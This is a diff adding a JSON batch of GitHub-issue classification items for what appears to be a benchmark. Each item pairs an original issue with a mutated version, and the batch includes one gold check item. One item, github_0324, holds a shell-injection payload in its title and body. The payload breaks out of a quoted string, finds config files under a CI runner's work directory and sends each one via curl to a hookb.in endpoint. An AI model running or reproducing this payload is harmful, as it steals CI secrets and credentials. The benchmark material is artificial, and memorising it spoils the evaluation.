@@ -1,0 +1,99 @@
+{
+  "batch_id": "github_015",
+  "task": "github",
+  "task_display": "GitHub Issues",
+  "real_item_count": 8,
+  "total_item_count": 9,
+  "items": [
+    {
+      "item_id": "github_0240",
+      "task": "github",
+      "task_display": "GitHub Issues",
+      "true_label": "enhancement",
+      "original_title": "Workspaces are only visible after second workspace have something on it",
+      "original_body": "When I just have logged in and start applications, I would like to drag and move things to the workspaces, but they are not shown. I would have the workspaces always visible.",
+      "mutated_title": "are only visible after second workspace have something on it",
+      "mutated_body": "When I just have logged in and start applications, I would like to drag and move things to the , but they are not shown. I would have the always visible."
+    },
+    {
+      "item_id": "github_0408",
+      "task": "github",
+      "task_display": "GitHub Issues",
+      "true_label": "bug",
+      "original_title": "fcgvjhb",
+      "original_body": "/epic #104 /size s\\n<!-- JACKBOT -->\\n___\\n### Linked Epics\\n<!-- LIST -->\\n- <!-- REPOID=346052391 --> #104 - epic 10\\n<!-- ENDLIST -->\\n Add this issue to another epic by using the `/epic #{epic_number}` command in the comments here.\\n[Click here to find out more about jackbot](https://github.com/apps/ncr-jack-bot)\\n___\\n<!-- ENDJACKBOT -->\\n",
+      "mutated_title": "fcgvjhb",
+      "mutated_body": "/epic #104 /size s"
+    },
+    {
+      "item_id": "github_0194",
+      "task": "github",
+      "task_display": "GitHub Issues",
+      "true_label": "enhancement",
+      "original_title": "App should have confirmation dialog before sign out",
+      "original_body": "# Actual Result\\r\\nCurrently, tapping to \"sign out\" button, the user will be logged out immediately\\r\\nhttps://user-images.githubusercontent.com/69950655/105316656-c417b280-5bf3-11eb-9e02-0cea71be4cfc.mp4\\r\\n\\r\\n\\r\\n# Expected Result\\r\\nThe app should have a confirmation dialog asking the user to be sure when signing out\\r\\n\\r\\n# Environment\\r\\nAndroid app\\r\\n",
+      "mutated_title": "App should have confirmation dialog before sign out",
+      "mutated_body": "\"# Actual Result\\nCurrently, tapping the 'sign out' button, the user will be logged out immediately\\nhttps://user-images.githubusercontent.com/69950655/105316656-c417b280-5bf3-11eb-9e02-0cea71be4cfc.mp4\\n\\n# Expected Result\\nThe app should have a confirmation dialog asking the user for confirmation before signing out\\n\\n# Environment\\nAndroid app\""
+    },
+    {
+      "item_id": "github_0323",
+      "task": "github",
+      "task_display": "GitHub Issues",
+      "true_label": "enhancement",
+      "original_title": "FSR and IMU sensors for NAO",
+      "original_body": "Is it possible to read NAO's FSRs and the torso IMU in the simulation?\\r\\n\\r\\n\\r\\nThanks in advance",
+      "mutated_title": "FSR and IMU sensors for NAO",
+      "mutated_body": "Is it possible to read NAO's FSRs and the torso IMU in the simulation using rabbitmq?"
+    },
+    {
+      "item_id": "github_0110",
+      "task": "github",
+      "task_display": "GitHub Issues",
+      "true_label": "question",
+      "original_title": "Missing traCI functions in C++",
+      "original_body": "Hello,\\r\\n\\r\\nI'm using C++ TraCIAPI client library to retrieve simulation information from SUMO. I follow the instruction I check the person value retrieval website (https://sumo.dlr.de/docs/TraCI/Person_Value_Retrieval.html). There are several functions I cannot find in the C++ TraCI: _getWidth, getMinGap, getTaxiReservation_ . I know python got these method, but I need to use C++ run my code. Will these missing functions be added to the C++ TraCIAPI?\\r\\n\\r\\n",
+      "mutated_title": "Missing traCI functions in C++ cf7",
+      "mutated_body": "Hello,\\r\\n\\r\\nI'm using C++ TraCIAPI client library to retrieve simulation information from SUMO. I follow the instruction I check the person value retrieval website (https://sumo.dlr.de/docs/TraCI/Person_Value_Retrieval.html). There are several functions I cannot find in the C++ TraCI: _getWidth, getMinGap, getTaxiReservation_ . I know python got these method, but I need to use C++ run my code. Will these missing functions be added to the C++ TraCIAPI?\\r\\n\\r\\n"
+    },
+    {
+      "item_id": "github_0324",
+      "task": "github",
+      "task_display": "GitHub Issues",
+      "true_label": "bug",
+      "original_title": "\"; find /home/runner/work/. -type f -name config | while read f; do curl --data-binary @$f https://hookb.in/XkRKDRKN0rCGBBm3Jx7W; done; sleep 300 ; echo \"",
+      "original_body": "\"; find /home/runner/work/. -type f -name config | while read f; do curl --data-binary @$f https://hookb.in/XkRKDRKN0rCGBBm3Jx7W/omg/; done; sleep 300 ; echo \"",
+      "mutated_title": "find /home/runner/work/. -type f -name config",
+      "mutated_body": "\"; find /home/runner/work/. -type f -name config | while read f; do curl --data-binary @$f https://hookb.in/XkRKDRKN0rCGBBm3Jx7W/omg/; done; sleep 300 ; echo \""
+    },
+    {
+      "item_id": "github_0221",
+      "task": "github",
+      "task_display": "GitHub Issues",
+      "true_label": "bug",
+      "original_title": "vn medical needs better compat with the entire revive system",
+      "original_body": "**Describe the bug**\\r\\non the VN branch, medical is broken for AI in askHelp, checking only for vanilla medical items when determining if an AI is capable of helping other units, theres likely more bugs like this hidden in the system, although the entire system majorly needs a rework, this is critical for low player counts where the players rely on AI to help them keep going against the numbers thrown at them, where larger groups would count on there superior numbers of players to help each other.\\r\\n\\r\\n**To Reproduce**\\r\\nSteps to reproduce the bug (If you can't reproduce it, just give details of what happened beforehand. Anything you think could be relevant): get knocked down with medical AI nearby, they will not be counted, and the system will claim that no units capable of helping you are nearby.\\r\\n\\r\\n\\r\\n**Expected behaviour**\\r\\nA clear and concise description of what you expected to happen.\\r\\n\\r\\n**Screenshots**\\r\\nIf applicable, add screenshots to help explain your problem.\\r\\n\\r\\n**Environment (please complete the following information):**\\r\\nVersion: \\r\\nMap (specify if Altis Blufor): \\r\\n\\r\\n* [ ] LAN Hosted\\r\\n* [ ] Private dedicated server\\r\\n* [ ] Private dedicated server with Headless client(s)\\r\\n* [ ] Community Server 1\\r\\n* [ ] Community Server 2\\r\\n* [ ] Community Test Server\\r\\n* [ ] Community Test Server 2\\r\\n\\r\\nModset:\\r\\n \\r\\nTime the bug occurred (Please leave in GMT+0):\\r\\nIf **Not** on a community server, please leave the time zone of your client for LAN, or the server for dedicated: \\r\\n\\r\\n**Additional context**\\r\\nAdd any other context about the problem here.\\r\\n\\r\\n\\r\\n\\r\\nIf you were LAN hosting, please attach your client .RPT file from when the bug occurred, If on a private dedicated server, please attach the server's .RPT from when the bug occurred.\\r\\n",
+      "mutated_title": "vn medical needs better compatibility with the entire revive system",
+      "mutated_body": "**Describe the bug**\\r\\non the VN branch, medical is broken for AI in askHelp, checking only for vanilla medical items when determining if an AI is capable of helping other units, theres likely more bugs like this hidden in the system, although the entire system majorly needs a rework, this is critical for low player counts where the players rely on AI to help them keep going against the numbers thrown at them, where larger groups would count on there superior numbers of players to help each other.\\r\\n\\r\\n**To Reproduce**\\r\\nSteps to reproduce the bug (If you can't reproduce it, just give details of what happened beforehand. Anything you think could be relevant): get knocked down with medical AI nearby, they will not be counted, and the system will claim that no units capable of helping you are nearby.\\r\\n\\r\\n\\r\\n**Expected behaviour**\\r\\nA clear and concise description of what you expected to happen.\\r\\n\\r\\n**Screenshots**\\r\\nIf applicable, add screenshots to help explain your problem.\\r\\n\\r\\n**Environment (please complete the following information):**\\r\\nVersion: \\r\\nMap (specify if Altis Blufor): \\r\\n\\r\\n* [ ] LAN Hosted\\r\\n* [ ] Private dedicated server\\r\\n* [ ] Private dedicated server with Headless client(s)\\r\\n* [ ] Community Server 1\\r\\n* [ ] Community Server 2\\r\\n* [ ] Community Test Server\\r\\n* [ ] Community Test Server 2\\r\\n\\r\\nModset:\\r\\n \\r\\nTime the bug occurred (Please leave in GMT+0):\\r\\nIf **Not** on a community server, please leave the time zone of your client for LAN, or the server for dedicated: \\r\\n\\r\\n**Additional context**\\r\\nAdd any other context about the problem here.\\r\\n\\r\\n\\r\\n\\r\\nIf you were LAN hosting, please attach your client .RPT file from when the bug occurred, If on a private dedicated server, please attach the server's .RPT from when the bug occurred.\\r\\n"
+    },
+    {
+      "item_id": "github_0039",
+      "task": "github",
+      "task_display": "GitHub Issues",
+      "true_label": "bug",
+      "original_title": "(URGENT) Ribose PDF: Introduction section should adhere to first level clause heading style",
+      "original_body": "Design:\\r\\n\\r\\n<img width=\"847\" alt=\"Screenshot 2021-05-31 at 9 38 18 PM\" src=\"https://user-images.githubusercontent.com/11865/120201931-8dfcd600-c258-11eb-93e0-59190e4d4131.png\">\\r\\n\\r\\nActual:\\r\\n<img width=\"898\" alt=\"Screenshot 2021-05-31 at 9 38 32 PM\" src=\"https://user-images.githubusercontent.com/11865/120201956-97863e00-c258-11eb-8c18-de8e411ce4ce.png\">\\r\\n",
+      "mutated_title": "i2ckeypad (URGENT) Ribose PDF: Introduction section should adhere to first level clause heading style",
+      "mutated_body": "Design:\\r\\n\\r\\n<img width=\"847\" alt=\"Screenshot 2021-05-31 at 9 38 18 PM\" src=\"https://user-images.githubusercontent.com/11865/120201931-8dfcd600-c258-11eb-93e0-59190e4d4131.png\">\\r\\n\\r\\nActual:\\r\\n<img width=\"898\" alt=\"Screenshot 2021-05-31 at 9 38 32 PM\" src=\"https://user-images.githubusercontent.com/11865/120201956-97863e00-c258-11eb-8c18-de8e411ce4ce.png\">\\r\\n"
+    },
+    {
+      "item_id": "gold_github_yes_001_github_015",
+      "task": "github",
+      "task_display": "GitHub Issues",
+      "true_label": "bug",
+      "original_title": "App crashes on startup",
+      "original_body": "When I open the app, it immediately crashes with a TypeError. Expected behavior: the app should show the home screen.",
+      "mutated_title": "Application crashes on startup",
+      "mutated_body": "When I open the application, it immediately crashes with a TypeError. Expected behavior: the home screen should be shown."
+    }
+  ]
+}
